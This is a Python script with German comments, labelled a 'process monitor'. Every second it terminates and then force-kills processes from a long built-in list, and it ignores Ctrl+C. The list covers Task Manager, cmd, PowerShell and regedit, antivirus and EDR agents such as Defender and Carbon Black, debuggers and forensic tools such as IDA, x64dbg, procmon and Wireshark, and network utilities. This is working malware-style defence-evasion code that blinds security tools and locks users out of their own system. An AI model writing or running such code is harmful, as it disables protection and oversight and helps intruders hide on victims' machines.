import time
import psutil
import sys
import logging
import signal
from datetime import datetime

# Logging einrichten
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='process_monitor.log'
)

def load_process_list(config_path="processes.json"):
    """
    Lädt die zu überwachenden Prozesse aus einer Konfigurationsdatei (JSON), falls vorhanden.
    Gibt eine Liste von Prozessnamen zurück oder None, falls keine Datei existiert oder ein Fehler auftritt.
    """
    import os, json
    if os.path.exists(config_path):
        with open(config_path, 'r') as f:
            try:
                return json.load(f)
            except Exception as e:
                logging.error(f"Fehler beim Laden der Prozessliste aus {config_path}: {e}")
    return None


def kill_processes(target_processes):
    """
    Überwacht laufende Prozesse und beendet alle, die in der Ziel-Liste stehen.
    - Versucht zunächst ein sanftes Beenden (terminate), dann ggf. kill.
    - Ignoriert STRG+C (SIGINT) im Hauptthread.
    - Gibt Alarme bei unerwartetem Prozessstart aus.
    - Nutzt psutil.wait_procs für sauberes Beenden.
    """
    import threading
    if threading.current_thread() is threading.main_thread():
        signal.signal(signal.SIGINT, signal.SIG_IGN)
    logging.info(f"Prozessmonitor gestartet. Überwachte Prozesse: {target_processes}")
    print(f"Prozessmonitor läuft... (Überwachte Prozesse: {target_processes})")
    print("STRG+C wird ignoriert. Prozess kann nicht beendet werden.")

    target_processes_lower = [name.lower() for name in target_processes]
    notified = set()  # Für Alarmierung bei neuen Prozessen

    try:
        while True:
            found_procs = []  # Liste der gefundenen Zielprozesse
            for proc in psutil.process_iter(['pid', 'name']):
                process_info = proc.info
                process_name = process_info['name']
                # Prüfe, ob Prozessname in der Überwachungsliste ist
                if process_name and process_name.lower() in target_processes_lower:
                    pid = process_info['pid']
                    try:
                        proc.terminate()  # Sanftes Beenden versuchen
                        found_procs.append(proc)
                        current_time = datetime.now().strftime("%H:%M:%S")
                        print(f"[{current_time}] Prozess terminiert: {process_name} (PID: {pid})")
                        logging.info(f"Prozess terminiert: {process_name} (PID: {pid})")
                        # Alarm/Benachrichtigung bei unerwartetem Prozessstart (nur einmal pro Name)
                        if process_name.lower() not in notified:
                            print(f"ALARM: {process_name} wurde unerwartet gestartet!")
                            logging.warning(f"ALARM: {process_name} wurde unerwartet gestartet!")
                            notified.add(process_name.lower())
                    except Exception as e:
                        logging.error(f"Fehler beim Terminieren von {process_name}: {e}")
            # Warte auf das Beenden der Prozesse, ggf. hart beenden
            if found_procs:
                gone, alive = psutil.wait_procs(found_procs, timeout=3)
                for p in alive:
                    try:
                        p.kill()  # Hartes Beenden, falls noch aktiv
                        logging.info(f"Prozess musste hart beendet werden: {p.name()} (PID: {p.pid})")
                    except Exception as e:
                        logging.error(f"Fehler beim Killen von {p.name()}: {e}")
            time.sleep(1)  # Kurze Pause, um Systemlast zu reduzieren
    except Exception as e:
        logging.error(f"Unerwarteter Fehler im Prozessmonitor: {e}")
        return


def kill():
    """
    Hauptfunktion: Lädt Prozessliste (ggf. aus Konfigurationsdatei) und startet die Überwachung.
    Zusätzliche Prozesse können per Kommandozeilenargument ergänzt werden.
    """
    config_processes = load_process_list()
    default_processes = [
        # Systemtools
        "Taskmgr.exe", "ProcessHacker.exe", "procexp.exe", "procexp64.exe", "perfmon.exe",
        "msconfig.exe", "regedit.exe", "cmd.exe", "powershell.exe", "pwsh.exe",
        "wmic.exe", "services.exe", "resmon.exe", "SystemSettings.exe",
        "eventvwr.exe", "gpedit.msc", "mmc.exe", "dxdiag.exe", "verifier.exe",
        "sigverif.exe", "tasklist.exe", "taskkill.exe",

        # Sicherheits-/Antiviren-Tools
        "MsMpEng.exe", "NortonSecurity.exe", "avp.exe", "avgui.exe", "avastui.exe",
        "mcshield.exe", "ashDisp.exe", "bdagent.exe", "f-secure.exe", "savservice.exe",
        "ekrn.exe", "cfp.exe", "zatray.exe", "mbam.exe", "mbamtray.exe", "wrsa.exe",
        "SecHealthUI.exe", "ccSvcHst.exe", "egui.exe", "avguard.exe", "pav.exe",
        "clamscan.exe", "trusteer.exe", "msmpengcp.exe", "sbiectrl.exe", "vsmon.exe",
        "gdscan.exe", "v3svc.exe", "spysweeper.exe", "detectionengine.exe", "hipsservice.exe",
        "cortexagent.exe", "carbonblack.exe",

        # Debugging / Forensik / Analyse
        "windbg.exe", "ollydbg.exe", "ida.exe", "ida64.exe", "ImmunityDebugger.exe",
        "x64dbg.exe", "procmon.exe", "tcpview.exe", "wireshark.exe", "fiddler.exe",
        "dumpcap.exe", "procdump.exe", "autoruns.exe", "accesschk.exe",
        "osqueryd.exe", "velociraptor.exe",

        # Netzwerktools & CLI
        "netstat.exe", "ipconfig.exe", "ping.exe", "tracert.exe",
        "nmap.exe", "curl.exe", "wget.exe"
    ]
    target_processes = config_processes if config_processes else default_processes.copy()
    if len(sys.argv) > 1:
        target_processes.extend(sys.argv[1:])
    kill_processes(target_processes)

if __name__ == "__main__":
    kill()